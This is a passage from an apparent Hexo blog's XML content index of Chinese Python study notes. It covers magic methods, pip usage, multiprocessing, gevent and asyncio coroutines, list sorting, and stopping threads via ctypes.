<strong>exit</strong></td><td align="left">环境管理器with obj as var:</td></tr></tbody></table><h1 id="file"><a href="#file" class="headerlink" title="__file__"></a>__file__</h1><blockquote><p>当前路径</p></blockquote><h1 id="doc"><a href="#doc" class="headerlink" title="__doc__"></a>__doc__</h1><pre><code class="python">class Foo:    &quot;&quot;&quot; 描述类信息，这是用于看片的神奇 &quot;&quot;&quot;    def func(self):        passprint Foo.__doc__#输出：类的描述信息</code></pre><h1 id="str"><a href="#str" class="headerlink" title="__str__"></a>__str__</h1><blockquote><p>如果一个类中定义了<strong>str</strong>方法，那么在打印 对象 时，默认输出该方法的返回值</p></blockquote><pre><code class="python">class Foo:    def __str__(self):        return &#39;alex li&#39;obj = Foo()print obj# 输出：alex li</code></pre><h1 id="module"><a href="#module" class="headerlink" title="__module__"></a>__module__</h1><blockquote><p>如果当前模块为顶层模块执行 则打印<strong>main</strong><br>如果当前模块为被调用模块的时候 打印当前模块的名称</p></blockquote><pre><code class="python">def fun():    passprint(fun.__module__)</code></pre><h1 id="name"><a href="#name" class="headerlink" title="__name__"></a>__name__</h1><blockquote><p>打印函数名称</p></blockquote><pre><code class="python">def fun():    passprint(fun.__name__)</code></pre><h1 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h1><blockquote><p>表示当前操作的对象的类是什么</p></blockquote><pre><code class="python">from lib.aa import Cobj = C()print obj.__module__  # 输出 lib.aa，即：输出模块print obj.__class__      # 输出 lib.aa.C，即：输出类</code></pre><h1 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h1><blockquote><p>构造方法，通过类创建对象时，自动触发执行</p></blockquote><pre><code class="python">class Role(object):    #初始化函数，在生成一个角色时要    初始化的一些属性就填写在这里        def __init__(self,name,role,weapon,life_value=100,money=15000):#__init__中的第一个参数self,和这里的self都 是什么意思？ 看下面解释self.name = name        self.role = role</code></pre><h1 id="del"><a href="#del" class="headerlink" title="__del__()"></a>__del__()</h1><blockquote><p>析构方法，当对象在内存中被释放时，自动触发执行</p></blockquote><pre><code class="python">class Role(object):    def __init__(self,name,role,weapon:        self.name = name        self.role = role        self.weapon = weapon    def __del__(self):             #析构函数        print(&quot;del.....run...&quot;)r1 = Role(&#39;Alex&#39;,&#39;police&#39;,&#39;AK47&#39;)    #生成一个角色</code></pre><h1 id="call"><a href="#call" class="headerlink" title="__call__()"></a>__call__()</h1><pre><code class="python">#所有的函数都是可调用对象。#一个类实例也可以变成一个可调用对象，特殊方法__call__()。# 让调用更简单class Person(object):    def __init__(self, name, gender):        self.name = name        self.gender = gender    def __call__(self, friend):        print &#39;My name is %s...&#39; % self.name        print &#39;My friend is %s...&#39; % friend</code></pre><pre><code class="python">现在可以对 Person 实例直接调用：&gt;&gt;&gt; p = Person(&#39;Bob&#39;, &#39;male&#39;)&gt;&gt;&gt; p(&#39;Tim&#39;)My name is Bob...My friend is Tim...</code></pre><h1 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a>__dict__</h1><blockquote><p>查看类或对象中的所有成员</p></blockquote><pre><code class="python">print(类.__dict__) # 打印类里所有属性，不包括实例属性print(实例.__dict__) #打印实例所有属性，不包括类属性</code></pre><h1 id="slots"><a href="#slots" class="headerlink" title="__slots__"></a>__slots__</h1><blockquote><p>可以限制 class的属性</p></blockquote><p>参考： <a href="https://www.cnblogs.com/ifantastic/p/3768415.html" target="_blank" rel="noopener">[Python] dir() 与 <strong>dict</strong>，<strong>slots</strong> 的区别</a></p><p><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923030542875328" target="_blank" rel="noopener">使用<strong>slots</strong></a></p><blockquote><p>在默认情况下，Python 的新类和旧类的实例都有一个字典来存储属性值。这对于那些没什么实例属性的对象来说太浪费空间了，当需要创建大量实例的时候，这个问题变得尤为突出。<br>　　因此这种默认做法可以通过在新式类中定义一个 <strong>slots</strong> 属性从而得到解决。<strong>slots</strong> 声明中包含若干实例变量，并为每个实例预留恰好足够的空间来保存每个变量，因为没有为每个实例都创建一个字典，从而节省空间。</p></blockquote><h1 id="getattr"><a href="#getattr" class="headerlink" title="__getattr__"></a>__getattr__</h1><blockquote><p>当访问object不存在的属性时会调用该方法</p></blockquote><pre><code class="python">定义了__getattr__()，当访问object不存在的属性时会调用该方法不定义访问不存在的属性时会报 AttributeErroreg:class Cat(object):　　def __init__(self):　　　　self.name = &quot;jn&quot;　　def __getattr__(self, item):　　　　return &quot;tm&quot;cat = Cat()print(cat.name)print(getattr(cat, &#39;name&#39;))print(&quot;*&quot; * 20)print(cat.age)print(getattr(cat, &#39;age&#39;))</code></pre><h1 id="setattr"><a href="#setattr" class="headerlink" title="__setattr__"></a>__setattr__</h1><blockquote><p>当设置类实例属性时自动调用，如j.name=5 就会调用<strong>setattr</strong>方法 </p></blockquote><pre><code class="python">class Dict(dict):    def __getattr__(self, key):        try:            return self[key]        except KeyError:            raise AttributeError(r&quot;&#39;Dict&#39; object has no attribute &#39;%s&#39;&quot; % key)    def __setattr__(self, key, value):        self[key] = valued = Dict(a=1, b=2)print (d[&#39;a&#39;])print (d.a) #调用类中原本没有定义的属性时候，调用__getattr__d.a = 100 #对实例的属性进行赋值的时候调用__setattr__print (d[&#39;a&#39;])</code></pre><h1 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a>__getattribute__</h1><blockquote><p>当每次调用属性时，python会无条件进入<strong>getattribute</strong>中，不论属性存在与否，这就是与<strong>getattr</strong>的区别 </p></blockquote><blockquote><p>必须特别小心 getattribute() 方法，因为 Python 在查找类的方法名称时也将对其进行调用。</p></blockquote><h1 id="getitem-、-setitem-、-delitem"><a href="#getitem-、-setitem-、-delitem" class="headerlink" title="__getitem__、__setitem__、__delitem__"></a>__getitem__、__setitem__、__delitem__</h1><blockquote><p>用于索引操作，如字典。以上分别表示获取、设置、删除数据</p></blockquote><pre><code class="python">class Foo(object):    def __getitem__(self, key):        print(&#39;__getitem__&#39;,key)    def __setitem__(self, key, value):        print(&#39;__setitem__&#39;,key,value)    def __delitem__(self, key):        print(&#39;__delitem__&#39;,key)obj = Foo()result = obj[&#39;k1&#39;]      # 自动触发执行 __getitem__obj[&#39;k2&#39;] = &#39;alex&#39;   # 自动触发执行 __setitem__del obj[&#39;k1&#39;]</code></pre><h1 id="get-set-delete"><a href="#get-set-delete" class="headerlink" title="__get__,__set__,__delete__"></a>__get__,__set__,__delete__</h1><blockquote><p>属性描述符的原理利用的是抽象的方法， 把十几个字段共同的特性抽出来</p></blockquote><pre><code class="python">class Int_validation:    def __get__(self, instance, owner):        return  self.value    def __set__(self, instance, value):        if  isinstance(value,int) and 0&lt;value&lt;100:            self.value=value        #这个要注意 要用value，不能用instance 否则会陷入死循环        else:            print(&quot;请输入合法的数字&quot;)    def __delete__(self, instance):        passclass Student:    age=Int_validation()stu=Student()   stu.age=50print(stu.age)</code></pre><h1 id="new-metaclass-（自定义类）"><a href="#new-metaclass-（自定义类）" class="headerlink" title="__new__/__metaclass__ *（自定义类）"></a>__new__/__metaclass__ *（自定义类）</h1><p>参考： <a href="https://www.jianshu.com/p/224ffcb8e73e" target="_blank" rel="noopener">https://www.jianshu.com/p/224ffcb8e73e</a></p><blockquote><p><strong>new</strong>:是用来创建实例的，对类实例化之前进行定制，可以用到。<br><strong>metaclass</strong>：定义一个类如何被创建<br>类的生成 调用 顺序依次是 <strong>new</strong> –&gt; <strong>init</strong> –&gt; <strong>call</strong></p></blockquote><pre><code class="python">#创建类特殊方式def func(self):    print(self.name,self.age)def __init__(self,name,age):    self.name = name    self.age = age#通过Type实例化产生的Foo类，Foo是Type的对象。#(object，)加入“,”是为了让括号知道他是个元组。#type第一个参数：类名#type第二个参数：当前类的基类#type第三个参数：类的成员Foo = type(&#39;Foo&#39;,(object,),{&#39;talk&#39;:func,                            &#39;__init__&#39;:__init__})f= Foo(&quot;Chrn&quot;,22)f.talk()print(type(Foo))#Type 为 类的类，所有类都是Type创建的</code></pre><pre><code class="python">class Metaclass(type):    def __new__(cls, name, bases, dct):        print &#39;HAHAHA&#39;        dct[&#39;a&#39;] = 1        return type.__new__(cls, name, bases, dct)print &#39;before Create OBJ&#39;class OBJ(object):    __metaclass__ = Metaclassprint &#39;after Create OBJ&#39;if __name__ == &#39;__main__&#39;:    print OBJ.a</code></pre><h1 id="add"><a href="#add" class="headerlink" title="__add__"></a>__add__</h1><blockquote><p>对象相加直接执行</p></blockquote><pre><code class="python">class foo:def __init__(self,name,age):self.name=nameself.age=agedef __add__(self, other):        temp=&quot;%s-%d&quot;%(self.name,other.age)return tempobj1=foo(&quot;aaa&quot;,123)#对象1obj2=foo(&quot;bbb&quot;,455)#对象2print(&quot;对象1&quot;,obj1)print(&quot;对象2&quot;,obj2)print(&#39;---自动执行add方法--------&#39;)ret=obj1+obj2 #self代表obj1，other代表obj2print(&quot;add方法&quot;,ret)</code></pre><h1 id="iter"><a href="#iter" class="headerlink" title="__iter__"></a>__iter__</h1><blockquote><p>生成器作用，返回值可以被迭代，需要使用for执行iter方法</p></blockquote><pre><code class="python">class foo:def __iter__(self):return iter([11,22,33,44,55])obj=foo()for item in obj:#for默认执行iter方法，拿到返回值，for需要一个可以被循环的东西（obj）    print(item)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pip使用.md</title>
      <link href="/2019/12/02/deploy/python/pip%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/12/02/deploy/python/pip%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="http://chenjiee815.github.io/pipzhi-nan.html" target="_blank" rel="noopener">pip指南</a></p><h1 id="pip使用"><a href="#pip使用" class="headerlink" title="pip使用"></a>pip使用</h1><blockquote><p>pip 安装特定版本的 Python 包</p></blockquote><pre><code class="python">pip install -v pycrypto==2.3</code></pre><blockquote><p>python 使用豆瓣的pypi源<br><a href="http://pypi.douban.com/simple/" target="_blank" rel="noopener">http://pypi.douban.com/simple/</a><br>注意后面要有/simple目录。 使用镜像源很简单，用-i指定就行了：   </p></blockquote><pre><code>sudo easy_install -i http://pypi.douban.com/simple/ saltTesting   sudo pip install -i http://pypi.douban.com/simple/ saltTesting</code></pre><blockquote><p> 使用requirements.txt</p></blockquote><p>生成</p><pre><code>pip freeze &gt; requirements.txt</code></pre><p>安装，在另一个环境下使用</p><pre><code>pip install -r requirements.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 发布包.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%8F%91%E5%B8%83%E5%8C%85/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%8F%91%E5%B8%83%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><a href="https://testerhome.com/topics/18616" target="_blank" rel="noopener">https://testerhome.com/topics/18616</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py requirements.md</title>
      <link href="/2019/12/02/deploy/python/py%20requirements/"/>
      <url>/2019/12/02/deploy/python/py%20requirements/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pip.readthedocs.io/en/1.1/requirements.html" target="_blank" rel="noopener">官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py pylint.md</title>
      <link href="/2019/12/02/deploy/python/py%20pylint/"/>
      <url>/2019/12/02/deploy/python/py%20pylint/</url>
      
        <content type="html"><![CDATA[<p>静态类型检查器</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py socket.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20socket/"/>
      <url>/2019/12/02/deploy/python/libs/py%20socket/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 多进程.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Linux 操作系统提供了一个 fork() 函数用来创建子进程，这个函数很特殊，调用一次，返回两次，<br>因为操作系统是将当前的进程（父进程）复制了一份（子进程），然后分别在父进程和子进程内返回。<br>子进程永远返回0，而父进程返回子进程的 PID。<br>我们可以通过判断返回值是不是 0 来判断当前是在父进程还是子进程中执行</p></blockquote><blockquote><p>最后，由于 fork() 是 Linux 上的概念，所以如果要跨平台，最好还是使用 subprocess 模块来创建子进程</p></blockquote><pre><code class="python">import osimport timeprint(&quot;Before fork process pid=%s, ppid=%s&quot; % (os.getpid(), os.getppid()))pid = os.fork()if pid == 0:    print(&quot;I am child process pid=%s, ppid=%s&quot; % (os.getpid(), os.getppid()))    time.sleep(5)else:    print(&quot;I am parent process pid=%s, ppid=%s&quot; % (os.getpid(), os.getppid()))    time.sleep(5)# 下面的内容会被打印两次，一次是在父进程中，一次是在子进程中。print(&quot;After fork process pid=%s, ppid=%s&quot; % (os.getpid(), os.getppid()))</code></pre><p>multiprocessing模块</p><pre><code class="python"># Python提供一个跨平台的多进程支持。# multiprocessing模块就是跨平台版本的多进程模块，可以在win上用from multiprocessing import Processimport os# 子进程要执行的代码def run_proc(name):    print(&#39;Run child process %s (%s)...&#39; % (name, os.getpid()))if __name__ == &#39;__main__&#39;:    print(&#39;Parent process %s.&#39; % os.getpid())    p = Process(target=run_proc, args=(&#39;test&#39;,))    print(&#39;Child process will start.&#39;)    p.start()    p.join()    print(&#39;Child process end.&#39;)</code></pre><pre><code class="python"># 使用进程池from multiprocessing import Poolimport os, time, randomdef long_time_task(name):    print(&#39;Run task %s (%s)...&#39; % (name, os.getpid()))    start = time.time()    time.sleep(random.random() * 3)    end = time.time()    print(&#39;Task %s runs %0.2f seconds.&#39; % (name, (end - start)))if __name__ == &#39;__main__&#39;:    print(&#39;Parent process %s.&#39; % os.getpid())    p = Pool(4)  # 由于Pool的默认大小是CPU的核数    for i in range(5):        p.apply_async(long_time_task, args=(i,))    print(&#39;Waiting for all subprocesses done...&#39;)    p.close()  #调用close()之后就不能继续添加新的Process了    p.join()    print(&#39;All subprocesses done.&#39;)</code></pre><p>subprocess</p><blockquote><p>subprocess模块可以让我们非常方便地启动一个子进程，然后控制其输入和输出</p></blockquote><pre><code class="python">import subprocessprint(&#39;$ nslookup www.python.org&#39;)r = subprocess.call([&#39;nslookup&#39;, &#39;www.python.org&#39;])print(&#39;Exit code:&#39;, r)# # import subprocessprint(&#39;$ nslookup&#39;)p = subprocess.Popen([&#39;nslookup&#39;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)output, err = p.communicate(b&#39;set q=mx\npython.org\nexit\n&#39;)print(output.decode(&#39;utf-8&#39;))print(&#39;Exit code:&#39;, p.returncode)</code></pre><p>分布式进程</p><p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017631559645600" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1016959663602400/1017631559645600</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py bottle.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20bottle/"/>
      <url>/2019/12/02/deploy/python/libs/py%20bottle/</url>
      
        <content type="html"><![CDATA[<p><a href="https://bottlepy.org/docs/dev/" target="_blank" rel="noopener">https://bottlepy.org/docs/dev/</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py random.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20random/"/>
      <url>/2019/12/02/deploy/python/libs/py%20random/</url>
      
        <content type="html"><![CDATA[<p>使用python random模块的choice方法随机选择某个元素</p><pre><code class="python">foo = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;]from random import choiceprint(choice(foo))</code></pre><p>使用python random模块的sample函数从列表中随机选择一组元素</p><pre><code class="python">import randomlist = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]#从list中随机获取5个元素，作为一个片断返回slice = random.sample(list, 5)#原有序列并没有改变。print(slice)print(list)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py pickledb.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20pickledb/"/>
      <url>/2019/12/02/deploy/python/libs/py%20pickledb/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pythonhosted.org/pickleDB/" target="_blank" rel="noopener">https://pythonhosted.org/pickleDB/</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 排序.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E6%8E%92%E5%BA%8F/"/>
      <url>/2019/12/02/deploy/python/py%20%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="dict排序"><a href="#dict排序" class="headerlink" title="dict排序"></a>dict排序</h2><pre><code># 简单的dictlst = [(&#39;d&#39;, 2), (&#39;a&#39;, 4), (&#39;b&#39;, 3), (&#39;c&#39;, 2)]# 按照value排序lst.sort(key=lambda k: k[1])# 按照key排序lst.sort(key=lambda k: k[0])# 先按value排序再按key排序lst.sort(key=lambda k: (k[1], k[0]))# 输出----&gt;&gt;&gt;# [(&#39;d&#39;, 2), (&#39;c&#39;, 2), (&#39;b&#39;, 3), (&#39;a&#39;, 4)]# [(&#39;a&#39;, 4), (&#39;b&#39;, 3), (&#39;c&#39;, 2), (&#39;d&#39;, 2)]# [(&#39;c&#39;, 2), (&#39;d&#39;, 2), (&#39;b&#39;, 3), (&#39;a&#39;, 4)]# 复杂的dictlst = [{&#39;level&#39;: 19, &#39;star&#39;: 36, &#39;time&#39;: 1},       {&#39;level&#39;: 20, &#39;star&#39;: 40, &#39;time&#39;: 2},       {&#39;level&#39;: 20, &#39;star&#39;: 40, &#39;time&#39;: 3},       {&#39;level&#39;: 20, &#39;star&#39;: 40, &#39;time&#39;: 4},       {&#39;level&#39;: 20, &#39;star&#39;: 40, &#39;time&#39;: 5},       {&#39;level&#39;: 18, &#39;star&#39;: 40, &#39;time&#39;: 1}]# 需求:# level越大越靠前;# level相同, star越大越靠前;# level和star相同, time越小越靠前;# 先按time排序lst.sort(key=lambda k: (k.get(&#39;time&#39;, 0)))# 再按照level和star顺序lst.sort(key=lambda k: (k.get(&#39;level&#39;, 0), k.get(&#39;star&#39;, 0)), reverse=True)for idx, r in enumerate(lst):    print(&#39;idx[%d]\tlevel: %d\t star: %d\t time: %d\t&#39; % (idx, r[&#39;level&#39;], r[&#39;star&#39;],r[&#39;time&#39;]))# 输出----&gt;&gt;&gt;# idx[0]   level: 20       star: 40        time: 2# idx[1]   level: 20       star: 40        time: 3# idx[2]   level: 20       star: 40        time: 4# idx[3]   level: 20       star: 40        time: 5# idx[4]   level: 19       star: 36        time: 1# idx[5]   level: 18       star: 40        time: 1</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 异步协程整理.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%BC%82%E6%AD%A5%E5%8D%8F%E7%A8%8B%E6%95%B4%E7%90%86/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%BC%82%E6%AD%A5%E5%8D%8F%E7%A8%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><strong><em>目前目的是搞清楚py的协程发展，以及常见的模块的联系，因为之前感觉很混乱，故整理如下。找时间还要再整理看下</em></strong></p><p>从0到1，Python异步编程的演进之路 - 知乎 <a href="https://zhuanlan.zhihu.com/p/25228075" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25228075</a></p><p>参考：  </p><ul><li>gevent: <a href="http://hhkbp2.com/gevent-tutorial/#" target="_blank" rel="noopener">http://hhkbp2.com/gevent-tutorial/#</a></li><li>gevent: <a href="https://softlns.github.io/2015/11/28/python-gevent/" target="_blank" rel="noopener">https://softlns.github.io/2015/11/28/python-gevent/</a></li></ul><p>gevent是基于协程的Python网络库,基于libevent的快速事件循环(Linux上epoll，FreeBSD上kqueue)</p><ul><li>gevent和asyncio: <a href="https://zhuanlan.zhihu.com/p/54657754" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/54657754</a></li></ul><p>使用asyncio(基于生成器的协程)，不建议使用 gevent. 为什么： <a href="https://toutiao.io/posts/w4qjkn/preview" target="_blank" rel="noopener">https://toutiao.io/posts/w4qjkn/preview</a></p><ul><li>asyncio官方文档: <a href="https://docs.python.org/zh-cn/3/library/asyncio-task.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/asyncio-task.html</a></li></ul><blockquote><p>协程底层原理,yield</p></blockquote><pre><code class="python"># 协程底层原理,yieldimport timedef task_1():    t = 0    while True:        time.sleep(1)        print(&quot;start a&quot;)        yield t        t += 1        print(&quot;end a&quot;)def task_2():    t = 0    while True:        time.sleep(1)        print(&quot;start b&quot;)        yield t        t += 1        print(&quot;end b&quot;)fa = task_1()fb = task_2()while True:    print(next(fa))    print(next(fb))</code></pre><blockquote><p>greenlet实现协程，封装了yield）</p></blockquote><pre><code class="python"># greenlet实现协程，封装了yield）from greenlet import greenlet  # 需要安装greenlet模块  sudo pip3 install greenlet (python2.x使用pip)import timedef test1():    while True:        print(&quot;---A--&quot;)        gr2.switch()  # 切换到gr2中的任务。        time.sleep(0.5)def test2():    while True:        print(&quot;---B--&quot;)        gr1.switch()  # 切换到gr1中的任务。        time.sleep(0.5)gr1 = greenlet(test1)  # greenlet 底层封装了yield。gr2 = greenlet(test2)# 切换到gr1中运行gr1.switch()print(&quot;end&quot;)</code></pre><blockquote><p>gevent实现协程，封装了greenlet(pip show gevent 可以查看依赖关系)，遇到阻塞代码自动切换协程任务</p></blockquote><pre><code class="python"># gevent实现协程，封装了greenlet，遇到阻塞代码自动切换协程任务import gevent  # 需要安装gevent模块  sudo pip3 install gevent (python2.x使用pip) import timedef f1(n):    for i in range(n):        print(gevent.getcurrent(), i)        gevent.sleep(0.5)   # 为了提高协程效率,遇到阻塞类代码,会自动切换协程任务。        # time.sleep(0.5)   # 阻塞类代码必须使用gevent自己包装的代码，原生阻塞类代码不会切换协程任务。                             # 可以使用monkey.patch_all()将所有原生阻塞类代码替换成gevent包装的阻塞类代码。 def f2(n):    for i in range(n):        print(gevent.getcurrent(), i)  # &lt;Greenlet &quot;Greenlet-0&quot; at 0x7f4a09b34648: f1(5)&gt; 0        gevent.sleep(0.5)        # time.sleep(0.5)def f3(n):    for i in range(n):        print(gevent.getcurrent(), i)        gevent.sleep(0.5)        # time.sleep(0.5)g1 = gevent.spawn(f1, 5)  # gevent其实是对greenlet的封装。g2 = gevent.spawn(f2, 5)  # 第一个参数f2表示协程执行的具体任务(函数)，第二个参数5表示要传给f2的参数g3 = gevent.spawn(f3, 5)g1.join()   # 遇到阻塞类代码,自动切换协程任务。g2.join()g3.join()</code></pre><blockquote><p>gevent打补丁，monkey自动替换原生阻塞类代码。重要，常用</p></blockquote><pre><code class="python"># gevent打补丁，monkey自动替换原生阻塞类代码。重要，常用import gevent  # 需要安装gevent模块  sudo pip3 install gevent (python2.x使用pip)import timefrom gevent import monkey# gevent打补丁monkey.patch_all()  # 将所有原生阻塞类代码自动替换成gevent包装的阻塞类代码。 def f1(n):    for i in range(n):        print(gevent.getcurrent(), i)        time.sleep(0.5)  # 会自动替换成 gevent.sleep(0.5)def f2(n):    for i in range(n):        print(gevent.getcurrent(), i)        time.sleep(0.5)def f3(n):    for i in range(n):        print(gevent.getcurrent(), i)        time.sleep(0.5)# g1 = gevent.spawn(f1, 5)# g2 = gevent.spawn(f2, 5)# g3 = gevent.spawn(f3, 5)# g1.join()# g2.join()# g3.join()# 一种简便写法gevent.joinall([        gevent.spawn(f1, 5),        gevent.spawn(f2, 5),        gevent.spawn(f3, 5)])</code></pre><blockquote><p>gevent底层原理</p></blockquote><pre><code class="python"># gevent底层原理import socketimport timetcp_server_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)tcp_server_tcp.bind((&quot;&quot;, 7899))tcp_server_tcp.listen(128)tcp_server_tcp.setblocking(False)  # 设置套接字为非堵塞的方式。 (接收数据时如果没有接到数据(阻塞)那么就抛异常,否则正常接收数据。)client_socket_list = list()  # 用于保存与客户端连接的套接字。while True:    # time.sleep(0.5)    try:        new_socket, new_addr = tcp_server_tcp.accept()  # 用抛异常的方式代替阻塞。    except Exception as ret:        print(&quot;---没有新的客户端到来---&quot;)    else:        print(&quot;---只要没有产生异常，那么也就意味着 来了一个新的客户端----&quot;)        new_socket.setblocking(False)  # 设置套接字为非堵塞的方式。 (如果需要阻塞就直接抛异常代替阻塞)        client_socket_list.append(new_socket)    for client_socket in client_socket_list:        try:            recv_data = client_socket.recv(1024)    # 用抛异常的方式代替阻塞。        except Exception as ret:            print(&quot;----这个客户端还没有发送过来数据----&quot;)        else:            if recv_data:                # 对方发送过来数据                print(&quot;----客户端发送过来了数据-----&quot;)            else:                # 对方调用close 导致了 recv返回                client_socket.close()                client_socket_list.remove(client_socket)                print(&quot;---客户端已经关闭----&quot;)</code></pre><blockquote><p>从yield/send =&gt; asyncio.coroutine和yield from =&gt; async和await, 参考:<br><a href="http://blog.guoyb.com/2016/07/03/python-coroutine/" target="_blank" rel="noopener">http://blog.guoyb.com/2016/07/03/python-coroutine/</a></p></blockquote><blockquote><p>async/await入门指南： <a href="https://zhuanlan.zhihu.com/p/27258289" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27258289</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 杀死子线程.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E6%9D%80%E6%AD%BB%E5%AD%90%E7%BA%BF%E7%A8%8B/"/>
      <url>/2019/12/02/deploy/python/py%20%E6%9D%80%E6%AD%BB%E5%AD%90%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/vinsuan1993/article/details/78158589" target="_blank" rel="noopener">https://blog.csdn.net/vinsuan1993/article/details/78158589</a></p><p>python杀死子线程例子</p><pre><code class="python"># coding:utf8import ctypesimport inspectimport threadingimport timeimport necoimport uiautomator2 as ut2class Runner(object):    def __init__(self, ip, port, packagename):        self.ip = ip        self.neco_port = port        self.packagename = packagename    def setup_handlers(self):        # 链接uiautomator2        self.u = ut2.connect(self.ip)        # 链接neco        self.n = neco.safe_connect(&quot;{ip}:{port}&quot;.format(ip=self.ip, port=self.neco_port))def _async_raise(tid, exctype):    &quot;&quot;&quot;raises the exception, performs cleanup if needed&quot;&quot;&quot;    tid = ctypes.c_long(tid)    if not inspect.isclass(exctype):        exctype = type(exctype)    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))    if res == 0:        raise ValueError(&quot;invalid thread id&quot;)    elif res != 1:        # &quot;&quot;&quot;if it returns a number greater than one, you&#39;re in trouble,        # and you should call it again with exc=NULL to revert the effect&quot;&quot;&quot;        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)        raise SystemError(&quot;PyThreadState_SetAsyncExc failed&quot;)def stop_thread(thread):    _async_raise(thread.ident, SystemExit)def _dump_hierarchy(n, ui_tree):    hierarchy = n.dump_hierarchy()    ui_tree.append(hierarchy)def dump_hierarchy(n, time_out=60):    ui_tree = []    hierarchy_thread = threading.Thread(target=_dump_hierarchy, name=&#39;_dump_hierarchy&#39;, args=[n, ui_tree])    # 将父线程设置为了守护线程。根据setDaemon()方法的含义，父线程打印内容后便结束了，不管子线程是否执行完毕了。    hierarchy_thread.setDaemon(True)    hierarchy_thread.start()    count = 0    while True:        if count &gt; time_out:            stop_thread(hierarchy_thread)            raise RuntimeError(&quot;dump_hierarchy faild: 没有获取到ui树&quot;)        if ui_tree:            return ui_tree[0]        time.sleep(1)        count += 1        # print(hierarchy_thread.isAlive())if __name__ == &quot;__main__&quot;:    runner = Runner(&quot;10.242.166.182&quot;, &quot;18812&quot;, &quot;com.netease.frxy&quot;)    runner.setup_handlers()    n = runner.n    u = runner.u    time.sleep(5)    a = dump_hierarchy(n, time_out=5)    print(a)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py defaultdict和namedtuple.md</title>
      <link href="/2019/12/02/deploy/python/built-in/py%20defaultdict%E5%92%8Cnamedtuple/"/>
      <url>/2019/12/02/deploy/python/built-in/py%20defaultdict%E5%92%8Cnamedtuple/</url>
      
